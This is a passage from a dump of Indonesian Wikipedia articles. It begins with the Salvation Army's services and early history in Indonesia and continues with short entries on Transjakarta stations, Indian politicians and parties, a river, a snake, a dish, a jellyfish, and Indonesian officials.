Dengan pusatnya di Medan, Divisi ini per 2015 memiliki jumlah Korps sebanyak 16, pos luar sebanyak 10, pelayanan sosial 2, serta 1 sekolah. Korps-korps tersebut dibagi menjadi Distrik Sumatera Utara dan Distrik Nias, serta Batam. Selain di Medan, Bala Keselamatan juga ada di Polonia, Belawan, Palu Subur, Kabanjahe, Pulau Sicanang, Bunuraya, Pematang Siantar, Samosir, Saribujawa, Sibolga, Bawomataluo, Hilifelago, Hilimondegeraya, Onohondro, dan Batam.

Selain divisi-divisi di atas, terdapat pula Regional Indonesia Bagian Timur dan Distrik Kalimantan Timur. Regional Indonesia Bagian Timur berpusat di Makassar dan meliputi Ambon, Balangbuki, Kobisonta, Sorong, Aimas, dan Jayapura, 7 korps, 2 pos luar, 1 klinik, dan 2 sekolah. Sementara itu Distrik Kalimantan Timur berpusat di Samarinda Utara, dan meliputi Balikpapan, Muara Batuq, Muara Mujan, dan Long Merah, 5 korps, 1 pos luar, 3 klinik, dan 2 sekolah.

Pelayanan Bala Keselamatan di Indonesia meliputi pelayanan gerejani, sosial, pendidikan, kesehatan, perlindungan anak dan anti perdagangan manusia ("antitrafficking")

PAUD-TK-SD-SMP-SMA-SMK-Sekolah Tinggi Teologi (STT) dan Sekolah Keperawatan (STIKES), dan Pusat Pendidikan dan Pelatihan (Pusdiklat), yaitu sekolah untuk calon pendeta Bala Keselamatan.

Masing-masing unit pelayanan ini telah ada di seluruh Indonesia dan berkembang hingga saat ini. Kehadiran pelayanan-pelayanan ini telah membantu dan menolong bagi semua warga dan masyarakat Indonesia. Bala Keselamatan tetap menjalankan visi dan misi mula-mula pendiri Bala Keselamatan yaitu Jenderal William Booth dengan tujuan untuk menjangkau jiwa-jiwa. Semua unit pelayanan ini ada di bagian pedalaman, desa, pinggiran kota, bahkan di pusat kota di seluruh Indonesia.

Jumlah korps Bala Keselamatan Indonesia saat ini (2015) ada lebih dari 250 korps dan 100 pos luar, 40 korps dan 5 pos luar di Divisi Jawa Bali, 14 korps dan 4 pos luar di Divisi Sulawesi Utara, 64 korps dan 7 pos luar di Divisi Kulawi, 54 korps dan 30 pos luar di Divisi Palu Timur, 49 korps dan 23 pos luar di Divisi Palu Barat, 23 korps dan 31 pos luar di Divisi Manggala, 16 korps dan 10 pos luar di Divisi Sumatera Utara, dan 12 korps dan 3 pos luar di distrik lainnya.

Bala Keselamatan Indonesia telah mendirikan berbagai sekolah yang menyediakan berbagai jenjang pendidikan di berbagai tempat di Indonesia, antara lain:


Selain bidang pendidikan, Bala Keselamatan Indonesia juga melakukan pelayanan medis. Pelayanan kesehatan untuk masyarakat dilakukan melalui rumah-rumah sakit dan klinik-klinik kesehatan, di kota-kota dan desa-desa, di beberapa propinsi dan kabupaten (Bandung, Semarang, Surabaya, Turen-Malang, Makassar, Palu, Sigi-Sulteng, Ambon, Long Iram-Kaltim, Minahasa-Sulut), antara lain:

Serta belasan klinik yang tersebar di berbagai daerah, 3 di Divisi Sulawesi Utara, 3 di Divisi Kulawi, 1 di Divisi Palu Timur, 1 di Divisi Indonesia Timur, dan 3 di Divisi Kalimantan Timur.

Pelayanan Sosial Bala Keselamatan Indonesia meliputi perumahan sosial, panti asuhan, panti wreda, dan panti karya.

Berdasarkan situs Bala Keselamatan Indonesia, saat ini ada 770 anak berusia antara 6-18 tahun, dan bersekolah di SD sampai SMU yang diasuh di 16 Panti Sosial Asuhan Anak (PSAA) Bala Keselamatan – 8 PSAA putra dan 8 PSAA putri. PSAA ini berlokasi di Pulau Jawa (7 PSAA), Bali (2 PSAA), Sumatera (2 PSAA), dan Sulawesi (5 PSAA). Panti-panti ini bertanggung jawab penuh dalam menyediakan pendidikan, makanan, kebutuhan sehari-hari, dan akomodasi bagi anak-anak yang datang dari berbagai macam latar belakang keluarga dan budaya.

Beberapa lokasi panti asuhan Bala Keselamatan antara lain:

Selain melayani anak-anak yatim piatu, Bala Keselamatan juga melayani orang-orang tua. 184 orang tua memperoleh akomodasi dan perawatan di 3 PSTW yang berlokasi di Bandung, Semarang dan Turen.

Selain itu Bala Keselamatan juga bergerak di bidang perlindungan anak dan anti perdagangan orang ("antitrafficking"). Besarnya jumlah anak di Indonesia yang rentan bahaya dan maraknya perdagangan anak-anak dan orang-orang dewasa mendorong Bala Keselamatan untuk aktif melakukan pelayanan ini dan bekerjasama dengan pemerintah, gereja-gereja dan LSM-LSM.

Departemen Pelayanan Sosial Bala Keselamatan mengatur program pendistribusi makanan 3 kali setahun bagi pengemudi becak, pemulung, dan anak jalanan. Dana berasal dari bazaar pengumpulan dana dan bantuan lokal lainnya.

Bala Keselamatan bekerja secara internasional untuk mengatasi kemiskinan dan ketidakadilan yang merendahkan martabat manusia serta mengedukasi masyarakat tentang apa makna hidup dalam kemiskinan – dan apa yang dapat mereka perbuat untuk menolong sesama. Bala keselamatan di Indonesia telah mulai mengatasi isu-isu khusus kemiskinan, angka kematian ibu dan bayi yang tinggi, serta persoalan perdagangan manusia, khususnya bekerja secara aktif untuk mewujudkan tiga sasaran khusus dalam Millenium Development Goals [Tujuan Pembangunan Milenium] yang diuraikan oleh Perserikatan Bangsa-Bangsa (#1, #4, #5).

Banyaknya kejadian banjir, tanah longsor, gempa bumi, dan bencana alam lainnya menyebabkan Bala Keselamatan merasa perlu untuk memiliki satuan khusus merespons kebutuhan-kebutuhan orang-orang di daerah bencana alam.

Pelayanan kaum wanita menyediakan kegiatan dan ibadah serta aktivitas lain yang didasarkan pada empat tujuan pelayanan kaum wanita International, yaitu Perhimpunan Kaum Wanita, yang diresmikan tahun 1907. Empat tujuan adalah: ibadah, pendidikan, persekutuan dan pelayanan.

Misi pelayanan kaum wanita adalah untuk: membawa kaum wanita kepada pengetahuan tentang Yesus Kristus, menggiatkan potensi penuh kaum wanita dalam mempengaruhi keluarga, sahabat dan masyarakat, memperlengkapi kaum wanita untuk bertumbuh dalam pengetahuan pribadi dan ketrampilan hidup, serta menangani persoalan yang mempengaruhi kaum wanita dan keluarga mereka di dunia.

Awal pelayanan Bala Keselamatan di Sulawesi Tengah (pada masa itu belum disebut Sulawesi Tengah, melainkan Bumi Tadulako) bermula di Rowiga, persisnya di kampung Sibedi. dengan nama Korps Mabere tahun 1913. Semula korps itu berada di pinggir jalan raya di Desa Sibedi. Namun sejarah juga mencatat bahwa korps tersebut terpaksa dipindahkan ketika terjadi pergolakan di awal kemerdekaan. Lokasi korps kini dibangun ke arah gunung. Korps Mabere memiliki lonceng gereja yang terbuat dari besi tempa dengan tahun pembuatan 1905. Selanjutnya tanggal 17 Oktober 1917 di kawasan Pipikoro diresmikan Korps Kantewu dan sekaligus Pembukaan Sekolah Rakyat.

Ada tiga pasang suami-istri yang mula-mula melayani di sana. Mula-mula Kapten Jensen dengan isterinya Nathalie, dari Denmark. Pasangan ini membuka pelayanan pertama Bala Keselamatan di Tanah Datar sekitar Palu. Ketika itu Kapten dan Nyonya Jensen menghadap Paduka Raja Parampasi di Palu. Pasangan opsir ini melaporkan maksud dan tujuan pasangan itu datang ke daerah itu. Dengan segala hormat perintis menyampaikan rencana pekerjaan, yang akan dilakukan di daerah baru, di wilayah kekuasaan Raja di Tanah Kaili itu. Singkat cerita, Raja Parampasi mendukung pelayanan pasangan Denmark itu dan menghibahkan sebidang tanah kepada mereka. Untuk tawaran pertama para perintis berkesimpulan bahwa tanah yang dihibahkan itu tidak pas. Kemudian mereka meminta lagi kepada sang raja lokasi yang lain. Raja merespons dan menawarkan alternatif lain sesuai dengan keinginan sang perintis. Setelah berdoa untuk kedua kalinya. Perintis mendapat jawaban dari Tuhan bahwa sebidang tanah yang terakhir ini cocok sebagai awal pelayanan pasangan muda itu

Menurut catatan para perintis, peristiwa itu terjadi pada tanggal 15 September 1913. Momen itulah dihitung sebagai titik awal pelayanan Bala Keselamatan di Bumi Tadulako itu. Di Rowiga kini dibangun sebuah tugu peringatan untuk mengenang peristiwa bersejarah tersebut. Lokasinya di lingkungan Perkantoran Bala Keselamatan Divisi Palu Barat. sekitar 10 km dari Kota Palu.

Dalam perkembangannya, para perintis Bala Keselamatan bekerja sama dengan orang-orang Kristen lainnya, para guru dan tenaga terdidik lainnya, dari berbagai tempat di Nusantara: dari Tanah Minahasa, Sangir Talaud di Sulawesi Utara, dan orang Ambon dari Tanah Maluku, untuk menjadi mediator sekaligus penerjemah bagi para perintis, sebelum mereka mempelajari dan menguasai bahasa setempat. Para pendatang ini ternyata banyak bersinggunggan dengan bidang pelayanan yang dikerjakan oleh Bala Keselamatan, yaitu di bidang pendidikan, kesehatan, pekerjaan umum, pengairan, pertanian, serta sebagai pegawai pemerintah kolonial di daerah rintisan itu. Ketika itu pelayanan Bala Keselamatan adalah denominasi Gereja resmi pertama, yang diakui pemerintah Hindia Belanda di wilayah ini. Dimulai dari membantu pelayanan Bala Keselamatan, di kemudian para pendatang merangkap dan bermitra, lalu banyak di antara mereka yang akhirnya bekerja penuh waktu menjadi opsir-opsir Bala Keselamatan asli Nusantara.

Setelah Kapten Jensen mendirikan rumah peribadatan pertama di sebidang tanah yang dihadiahkan Raja Parampas, wilayah pelayanan berkembang terus, mula-mula di sekitar Tanah Datar Rowiga di sekitar pinggiran Palu, kemudian menyebar naik lagi ke daerah pegunungan dan pedalaman. Bala Keselamatan kemudian melayani ke wilayah Dompu, Pakawa, Bunggu, yang kini dikenal sebagai Wilayah Pelayanan Divisi Palu Barat. Sementara itu ke arah Pantai Timur Kabupaten Donggala, pelayanan meluas hingga ke wilayah Parigi dan Mautong. Selanjutnya sejalan dengan tuntutan pelayanan, pelayanan juga diperluas ke wilayah Pantai Barat Donggala, di sekitar Pasangkayu, yang sekarang masuk wilayah Kabupaten Mamuju Utara, Sulawesi Barat. Dengan alasan untuk mendekatkan dan mengoptimalkan pelayanan. Daerah sekitar Pantai Barat dan wilayah Pasangkayu dan sekitarnya digabung dan dikembangkan secara terpisah dari wilayah kerja dan pelayanan Divisi Palu Barat. Wilayah pengembangan ini kini dikenal sebagai Wilayah Pelayanan Divisi Manggala. Divisi baru ini terdiri dari tiga distrik yaitu Distrik Malino, Mamuju Utara dan Lalundu. Kantor divisi baru itu berada di Dusun Duria Sulapa, dan sekaligus di sana berdiri sebuah korps, yakni Korps Duria Sulapa, di Desa Kalola, Kecamatan Bambalamotu, Kabupaten Mamuju Utara.

Selanjutnya pasangan yang kedua, Kapten Ensign Loois Beldrink (Hendrik?) dengan isterinya, Wilhemmina, dari Belanda, membuka pelayanan di daerah pedalaman dan pegunungan di sekitar Kulawi. Di Dataran Kulawi dimulai di Korps Kulawi pada tahun yang sama, yakni pada tahun 1913. Sangat mungkin bulannya saja yang berbeda, dengan pembukaan pelayanan di Rowiga oleh pasangan Jensen. Kemudian pelayanan Bala Keselamatan berkembang ke daerah-daerah di dataran Kulawi lainnya: Gimpu, Karangana, Lindu, Tobaku dan dataran Pipikoro.

Tiga setengah tahun kemudian, tahun 1917, disusul lagi oleh pasangan berkebangsaan Inggris, Kapten Leonard Woodward dan isterinya, Maggie. Pasangan ini membuka pelayanan di daerah pedalaman di desa Kantewu. Kapten Jensen merintis pelayanan di sebidang tanah hibah seorang raja lokal yang terletak di sebelah barat jalan besar. Wilayah yang dahulu disebut Uwetumbu, yang berarti Mata Air, berada di bawah sebuah Pohon Beringin Besar. Kini daerah itu dikenal sebagai bagian dari Desa Sibedi berbatasan dengan Desa Beka, Kecamatan Marawola, Kabupaten Sigi. Dalam perkembangan selanjutnya Kapten Jensen dikenal dengan panggilan sebagai Tua Jelawo’o, sebutan dalam bahasa lokal yang berarti Tuan Rambut Menyala atau Tuan Rambut Merah, karena warna rambutnya yang merah menyala.

Kini kedua wilayah pelayanan itu dikenal sebagai Wilayah Pelayanan Divisi Kulawi, dengan pusat pengembangan di Kulawi dan Kantewu

Pada tahun 1926 dimulailah pelayanan Bala Keselamatan di kota Palu, setelah tiga belas tahun dibuka pelayanan pertama di Rowiga dan Kulawi. Selanjutnya dari Palu berkembang ke arah aliran Sungai Gumbasa dan Dataran Rendah di lembah Palu dan sekitarnya. Lalu meluas lagi ke dataran Palolo, dan terakhir ke Napu Besoa, Kabupaten Poso. Kini wilayah kerja pelayanan ini dikenal sebagai Wilayan Pelayanan Divisi Palu Timur. Kini pelayanan Bala Keselamatan di Sulawesi Tengah bersatu dengan Provinsi Sulawesi Barat sudah ada di enam kabupaten dan kota, dan bergerak di empat bidang pelayanan, yakni bidang pelayanan rohani, pendidikan, kesehatan dan kesejahteraan sosial.




</doc>
<doc id="1755077" url="https://id.wikipedia.org/wiki?curid=1755077" title="Slamet Riyadi (Transjakarta)">
Slamet Riyadi (Transjakarta)

Slamet Riyadi adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Matraman Raya, Pal Meriam, Matraman, Jakarta Timur. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan.



</doc>
<doc id="1755078" url="https://id.wikipedia.org/wiki?curid=1755078" title="Pulo Ie, Kluet Selatan, Aceh Selatan">
Pulo Ie, Kluet Selatan, Aceh Selatan

Pulo Ie merupakan salah satu gampong yang ada di kecamatan Kluet Selatan, Kabupaten Aceh Selatan, provinsi Aceh, Indonesia. Kode wilayah Kemendagri untuk gampong ini yaitu 11.01.03.2006.


</doc>
<doc id="1755083" url="https://id.wikipedia.org/wiki?curid=1755083" title="Kebon Pala (Transjakarta)">
Kebon Pala (Transjakarta)

Kebon Pala adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Matraman Raya, Bali Mester, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan.



</doc>
<doc id="1755086" url="https://id.wikipedia.org/wiki?curid=1755086" title="Pasar Jatinegara (Transjakarta)">
Pasar Jatinegara (Transjakarta)

Pasar Jatinegara adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jatinegara Timur, Bali Mester, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Stasiun BRT ini menyediakan transfer ke Koridor 11 melalui stasiun BRT Stasiun Jatinegara 2




</doc>
<doc id="1755087" url="https://id.wikipedia.org/wiki?curid=1755087" title="Jatinegara RS Premier (Transjakarta)">
Jatinegara RS Premier (Transjakarta)

Jatinegara RS Premier adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jatinegara Timur, Bali Mester, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 5 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari RS Premier Jatinegara yang terletak di sebelah timur stasiun BRT.



</doc>
<doc id="1755252" url="https://id.wikipedia.org/wiki?curid=1755252" title="P. Sathasivam">
P. Sathasivam

Palanisamy Sathasivam (kelahiran 27 April 1949) adalah Gubernur Kerala saat ini. Ia pernah menjabat sebagai Ketua Keadilan India ke-40. Sathasivam adalah hakim kedua dari Tamil Nadu yang menjadi KKI. Ia juga merupakan mantan Ketua Keadilan Dewan Tertinggi pertama yang dilantik menjadi Gubernur sebuah negara bagian.

Sathasivam lahir dalam sebuah keluarga Kongu Vellalar dari pasangan Palaniswamy dan Natchiammal di Kadappanallur dekat Bhavani di distrik Erode. Ia lulus dari Kolese Hukum Pemerintah Chennai setelah menyelesaikan gelar BAnya dari Kolese Ayya Nadar Janaki Ammal, Sivakasi.

Sathasivam masuk sebagai seorang advokat pada 25 Juli 1973 di Madras. Ia kemudian dilantik pada jabatan Pleader Pemerintahan Tambahan, dan kemudian sebagai Pleader Pemerintahan Khusus di Dewan Tinggi Madras. Ia dilantik menjadi hakim permanen di Dewan Tinggi Madras pada 8 Januari 1996, dan dipindahkan ke Dewan Tinggi Punjab dan Haryana pada 20 April 2007. Ia terpilih pada jabatan Hakim Dewan Tertinggi pada 21 Agustus 2007. Pada masa jabatannya sebagai Ketua Keadilan, ia menjadi Ketua Dewan Umum Universitas Hukum Nasional Gujarat. Ia menggantikan Sheila Dikshit sebagai Gubernur Kerala.


</doc>
<doc id="1755259" url="https://id.wikipedia.org/wiki?curid=1755259" title="Partai Samajwadi">
Partai Samajwadi

Partai Samajwadi (PS; terjemahan: "Partai Sosialis"; didirikan pada 4 Oktober 1992) adalah sebuah partai politik negara bagian yang diakui di India yang berbasis di negara bagian India Uttar Pradesh (UP). Partai tersebut mendeskripsikan dirinya sendiei sebagai sebuah partai sosialis demokratik .

Partai Samajwadi menjadi salah satu dari beberapa partai yang didaruratkan ketika Janata Dal (Liga Rakyat), difragmentasikan dlm beberapa partai regional. Partai Samajwadi dipimpin oleh Mulayam Singh Yadav, yang merupakan seorang mantan Ketua Menteri Uttar Pradesh.



</doc>
<doc id="1755261" url="https://id.wikipedia.org/wiki?curid=1755261" title="Daftar pemimpin Oposisi India saat ini">
Daftar pemimpin Oposisi India saat ini

Ini adalah Pemimpin Oposisi saat ini dalam Parlemen India:
Ini adalah daftar Pemimpin Oposisi saat ini di Majelis Legislatif negara bagian dan teritorial India.

Ini adalah daftar Pemimpin Oposisi saat ini dalam Dewan Legislatif negara bagian India



</doc>
<doc id="1755262" url="https://id.wikipedia.org/wiki?curid=1755262" title="Tanah Merdeka (Transjakarta)">
Tanah Merdeka (Transjakarta)

Tanah Merdeka adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Letjen TB Simatupang, Kelurahan Rambutan, Ciracas, Jakarta Timur. Stasiun BRT ini berada di Koridor 7 yang membentang dari utara ke selatan. Nama stasiun BRT ini berasal dari Jalan Tanah Merdeka yang bersimpangan di sebelah stasiun BRT.




</doc>
<doc id="1755264" url="https://id.wikipedia.org/wiki?curid=1755264" title="Sushil Kumar Modi">
Sushil Kumar Modi

Sushil Kumar Modi (Hindi: सुशील कुमार मोदी) (kelahiran 5 Januari 1952) adalah seorang politikus India dari Partai Bharatiya Janata dan mantan Deputi Ketua Menteri dan Menteri Keuangan Bihar, India. Ia adalah anggota seumur hidup dari Rashtriya Swayamsevak Sangh. Ia dilantik menjadi Ketua Komite Pemberi Kekuatan Menteri Keuangan Negara Bagian untuk Implementasi Produk dan Pajak Pelayanan pada Juli 2011.


</doc>
<doc id="1755267" url="https://id.wikipedia.org/wiki?curid=1755267" title="Sungai Serawak">
Sungai Serawak

Sungai Serawak terletak di barat daya negara bagian Serawak, Malaysia. Hulu sungai ini terletak di Pegunungan Kapuas Hulu, dengan aliran sungai sepanjang 217 km (135 mil). Sungai ini terbagi menjadi dua, yaitu Sungai Sarawak Kanan dan Sungai Sarawak Kiri. Kuching, ibu kota negara bagian Serawak, terletak di tepi sungai ini. Di muara Sungai Sarawak terletak Pantai Damai, di mana banyak terdapat tempat penginapan dan merupakan tujuan wisata pantai yang populer.

Selain sebagai sumber air dan jalur transportasi, sungai ini juga rutin digunakan dalam pertandingan olahraga air tahunan, yaitu "Sarawak Regatta". Banjir besar pernah terjadi pada 24 Januari 2004, yaitu ketika ketinggian permukaan air Sungai Sarawak naik hingga 10,4 meter.



</doc>
<doc id="1755268" url="https://id.wikipedia.org/wiki?curid=1755268" title="Bidara Cina (Transjakarta)">
Bidara Cina (Transjakarta)

Bidara Cina adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Otto Iskandar di Nata, Kampung Melayu, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 7 yang membentang dari utara ke selatan.



</doc>
<doc id="1755269" url="https://id.wikipedia.org/wiki?curid=1755269" title="Gelanggang Remaja (Transjakarta)">
Gelanggang Remaja (Transjakarta)

Gelanggang Remaja adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Otto Iskandar di Nata, Kampung Melayu, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 7 yang membentang dari utara ke selatan.




</doc>
<doc id="1755270" url="https://id.wikipedia.org/wiki?curid=1755270" title="Shiromani Akali Dal">
Shiromani Akali Dal

Shiromani Akali Dal (SAD), terjemahan: "Partai Akali Tertinggi") adalah sebuah partai politik sentris Sikhisme di India. Terdapat sejumlah besar partai dengan nama "Shiromani Akali Dal". Partai tersebut diakui sebagai "Shiromani Akali Dal" oleh Komisi Pemilihan India yang dipimpin oleh Sukhbir Singh Badal. Partai tersebut dikontrol oleh badan keagamaan Sikh Shiromani Gurudwara Prabandhak Committee, Komite Manajemen Delhi Sikh Gurdwara dan merupakan partai politik Sikh paling berpengaruh dan terbesar di seluruh dunia. Dasar filsafat Akali Dal adalah memberikan suara politik kepada masalah-masalah Sikh dan partai tersebut percaya bahwa agama dan politik saling bahu membahu.

Berikut adalah daftar presiden partaibtersebut yang diberikan pada situs web partai tersebut.


</doc>
<doc id="1755271" url="https://id.wikipedia.org/wiki?curid=1755271" title="Cawang Otista (Transjakarta)">
Cawang Otista (Transjakarta)

Cawang Otista adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Otto Iskandar di Nata, Bidara Cina, Jatinegara, Jakarta Timur. Stasiun BRT ini berada di Koridor 7 yang membentang dari utara ke selatan.



</doc>
<doc id="1755272" url="https://id.wikipedia.org/wiki?curid=1755272" title="Ular-pohon Tanah Jampea">
Ular-pohon Tanah Jampea

Ular-pohon Tanah Jampea adalah sejenis ular kucing yang endemik di Pulau Jampea, Provinsi Sulawesi Selatan, Indonesia. Nama umumnya dalam bahasa Inggris adalah Tanahjampea Cat Snake.

Panjang tubuh ular jantan mencapai 1,2 meter, sedangkan yang betina mencapai 1,4 meter. Warna dasar tubuh abu-abu dengan bercak-bercak tebal berwarna cokelat lumut dan perut berwarna putih. Hidup di atas pohon. Mangsanya adalah kadal, tikus, dan burung.



</doc>
<doc id="1755273" url="https://id.wikipedia.org/wiki?curid=1755273" title="Front Demokratik Sikkim">
Front Demokratik Sikkim

Front Demokratik Sikkim (FDS) adalah sebuah partai politik regional di negara bagian Timur Laut India Sikkim.
Partai tersebut dibentuk oleh Pawan Kumar Chamling pada 1993. Partai tersebut memerintah negara bagian Sikkim sejak 1994 dengan Pawan Kumar Chamling sebagai ketua menteri. Partai tersebut mengkonsolidasikan posisi sweeping-nya pada pemilihan negara bagian 1999 dan 2004. Partai tersebut memenangkan 31 dari 32 kursi mahkamah pada pemilihan 2004. Pada pemilihan mahkamah 2009, partai tersebut membuat sebuah clean sweep, memenangkan seluruh 32 kursi. Partai tersebut juga tetap menjadi kursi Lok Sabha tunggal. Pada pemilihan mahkamah 2014, FDS memenangkan 22 kursi dan masih berkuasa. Kursi Lok Sabha tunggal juga dimenangkan oleh FDS.


</doc>
<doc id="1755275" url="https://id.wikipedia.org/wiki?curid=1755275" title="Okram Ibobi Singh">
Okram Ibobi Singh

Okram Ibobi Singh (kelahiran 19 Juni 1948) adalah Ketua Menteri negara bagian Manipur, India. Ia memegang jabatan tersebut sejak 7 Maret 2002. Pada 2012, ia membantu partainya memenangkan pemilihan negara bagian untuk ketiga kalinya dengan suara mayoritas absolut yakni 42 dari total 60 kursi mahkamah. Ia adalah anggota Kongres Nasional India.

Ia lahor dari pasangan Okram Angoubi dan Lukamani Devi di Athokpam dari distrik Thoubal. Ia adalah anak sulung dan memiliki lima saudara dan tiga saudari. Ia lahir dalam sebuah keluarga miskin dan membantu profesi ayahnya. Ia menikah dengan L. Landhoni Devi, yang memenangkan dua pemilihan konsekutif Mahkamah Legislatif Manipur dari Konstituensi Khangabok di Distrik Thoubal. Ia juga menjadi MLA wanita pertama di Distrik Thoubal.
Pada 2 September 2008, para pemberontak di negara bagian Manipur menyerang tempat tinggal resmi Shri Ibobi di Babupara, Imphal ketika ia sedang tertidur. Satu penjaga keamanan terluka dalam serangan tersebut, tetapi Singh selamat. Seorang anggota Partai Revolusioner Rakyat Kangleipak mengklaim bertanggung jawab atas serangan tersebut melalui telepon, dan menyatakan bahwa serangan tersebut merupakan peringatan terhadap Singh untuk menghentikan kebijakan-kebijakan terkait asuransi di Manipur.



</doc>
<doc id="1755278" url="https://id.wikipedia.org/wiki?curid=1755278" title="Yong tau fu">
Yong tau fu

Yong tau fu ("Romanisasi Hakka"： Ngiòng-theu-fú) disebut juga yong tahu, tahu yong, atau yong tau foo) adalah masakan tahu isi khas Hakka.

Ngiòng-theu-fú lahir dari pembentukan rakyat Hakka. Keadaan sulit yang mengharuskan hidup berpindah-pindah membuat mereka memasak makanan sederhana dan mudah. Ngiòng-theu-fú merupakan modifikasi jiaozi. Kulit jiaozi yang dibuat dari adonan tepung sulit didapatkan. Sebagai gantinya, mereka menggunakan tahu untuk lalu diisi dengan bahan-bahan berupa daging babi cincang. Kata 酿 (Dialek Meixian: "Ngiòng"', "pinyin": "Niang") merupakan istilah Hakka yang berarti "memasukkan bahan-bahan atau isi". Dialek Hakka dari daerah lain ada yang membacanya "yòng". Ada beberapa cara memasak, secara tradisional paling banyak dengan merebus di dalam panci, yang lainnya dengan menggoreng.

Hidangan Ngiòng-theu-fú sampai ke Asia Tenggara dimodifikasi oleh pengusaha rumah makan Hakka di Malaysia atau Singapura menjadi berbeda dengan yang aslinya. Masakan ini dapat ditemukan di kota-kota dengan komunitas Tionghoa di Asia Tenggara. Berbeda dengan hidangan yang aslinya, di sini yong tau fu terdiri dari tahu yang diisi cincangan daging yang dihaluskan (biasanya daging babi atau ikan), sehingga menjadi pasta yang lazim disebut "surimi" (semacam bakso ikan atau daging). Variasi makanan ini antara lain juga mencampurkan sayuran dan jamur ke dalam adonan daging atau ikan cincang. Yong tau fu dapat dimakan dengan banyak cara, antara lain disajikan berkuah kaldu, atau kering dengan tambahan saus kecap asin. Analogi terdekat hidangan ini di Indonesia, adalah tahu isi atau batagor kuah.

Hidangan ini di Thailand disebut "yentafo". Hidangan ini juga dapat ditemukan di rumah makan dan mal di beberapa kota besar di Indonesia, seperti di Jakarta, Bandung, Medan, Semarang dan Surabaya. Nama




</doc>
<doc id="1755286" url="https://id.wikipedia.org/wiki?curid=1755286" title="Malo maximus">
Malo maximus

Malo maximus (ejaan aslinya yang salah, Malo maxima) adalah ubur-ubur Irukandji kecil dan sangat berbisa yang ditemukan di dekat Australia. Sengatan yang berpotensi fatal seperti menyebabkan bentuk parah dari sindrom Irukandji. Spesies ini pertama kali dideskripsikan dengan ilmu pengetahuan pada tahun 2005, dan merupakan salah satu dari empat spesies dalam genus "Malo.


</doc>
<doc id="1755287" url="https://id.wikipedia.org/wiki?curid=1755287" title="Muhammad Syaiful Anwar">
Muhammad Syaiful Anwar

Drs. H. Muhammad Syaiful Anwar () adalah seorang politikus Indonesia. Ia juga merupakan pendiri Partai Indonesia Baru.

Dukungan untuk Syaiful Anwar pun mengalir deras. Setelah para kiai meminta kader Partai Demokrat ini maju, dukungan dan permintaan senada dikemukakan Aliansi Suara Rakyat (ASR). Banyak yang menilai sosok Syaiful sebagai pemimpin yang tegar, dan dapat mengembuskan angin segar kepada seluruh rakyat.

Syaiful adalah putra daerah Kecamatan Ciseeng, Kabupaten Bogor sekaligus putra ulama dan pejuang kemerdekaan Indonesia (Hizbullah Singandaru Bogor). Dianggap sangat pantas dan sesuai untuk menjadi calon Bupati Bogor periode 2013-2018.

Dia sendiri menilai perlu adanya sikap memperjuangkan ulama dan para guru ngaji yang tak diperhatikan kesejahteraannya. Dia ingin memperjuangkan bantuan untuk Ponpes Salafi yang selama ini tidak dilirik Kemenag. Menurutnya, harus ada penghargaan kepada kiai dan ulama, karena mereka ini pahlawan yang membangun negeri ini.



</doc>
<doc id="1755295" url="https://id.wikipedia.org/wiki?curid=1755295" title="Achmad Hudan Dardiri">
Achmad Hudan Dardiri

Achmad Hudan Dardiri () adalah Bupati Jombang yang menjabat pada periode 1979-1983 dan Wali Kota Pasuruan yang menjabat pada tahun 1969 hingga 1975.

Masa kecil Hudan bersama orang tua dan saudara-saudaranya tersebut ia jalani dengan penuh keprihatinan dan hidup dalam kesederhanaan. Ia masuk sekolah semacam Madrasah di daerah Jagalan. Di sela-sela waktu senggang ia belajar mengaji secara intensif kepada Sutan Hasan Halim, yang kemudian menjadi bapak angkatnya karena Hudan kecilbegitu disayanginya dan lantaran kepandaian dan ketekunannya dalam belajar. Ia juga aktif mengikuti kegiatan kepanduan pramuka yang kelak dunia kepramukaan ini digelutinya hingga di usia lanjut. Di samping bersekolah di Madrasah, ia juga masuk Sekolah Rendah (SR) dari tahun 1930 sampai 1938. Kemudian masuk Sekolah Guru Muallimin dari 1938 sampai 1941.

Lalu ia masuk sekolah Taman Dewasa pada 1943. Saat itu bimbingan dari seorang tokoh muslim lokal, Kyai Haji Sukri, telah mampu menambah wawasan
keislaman Hudan dan memberi pengaruh besar dalam kepemimpinannya kelak. Dalam kesemangatan belajar di usia remaja hingga dewasa itu, Achmad Hudan Dardiri tak menyia-nyiakan waktu untuk berleha-leha dan bermalas-malasan. Selain didikan dari kedua orang tuanya yang keras dan berdisiplin tinggi, ia juga mendapatkan pengajaranyang ketat dan asuhan yang penuh perhatian serta gemblengan untuk memegangi prinsip hidup dan agama dari Kyai Haji Sukri dan Sutan Hasan Halim. Didikan dari mereka sangatlah bermanfaat dalam membentuk karakter dan jati dirinya. Karena itu, salah satu keahliannya yang cukup disegani adalah kemampuannya dalam menguasai 3 bahasa asing dengan lancar, yakni bahasa Inggris, bahasa Belanda, dan bahasa Arab, selain bahasa Jawa dan bahasa Indonesia. Di samping itu, didikan dari para guru-gurunya untuk bertabligh dan menyiarkan Agama Islam baik di pelosok desa maupun di daerah sekitar tempat tinggalnya sangatlah ditekankan. Hal ini sebagai media penggemblengan dakwah dan pembentukan jadi diri sebagai muslim yang baik ia jalankan dengan sungguh-sungguh dan sepenuh jiwa raga.

Pada masa Perang Kemerdekaan, Achmad Hudan Dardiri masuk kesatuan "Chu Gakko" (penerjemah) pada 1944 sampai 1947. Dan melanjutkan studinya hingga ke Universitas Brawijaya dari tahun 1964 sampai tahun 1966, dengan mengambil Fakultas Hukum, dan lulus dengan predikat Sarjana Muda.

